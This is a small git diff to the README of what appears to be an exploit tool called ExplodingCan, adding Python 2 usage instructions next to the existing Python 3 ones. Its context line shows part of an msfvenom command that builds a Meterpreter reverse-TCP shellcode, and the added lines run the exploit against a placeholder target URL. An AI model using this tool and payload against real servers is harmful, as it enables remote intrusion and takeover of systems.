@@ -25,6 +25,12 @@ $ msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LH
 
 ## How To Use
 
+Python 2:
+```
+python explodingcan.py http://<target>
+```
+
+Python 3:
 ```
 python3 explodingcanPy3.py http://<target>
 ```
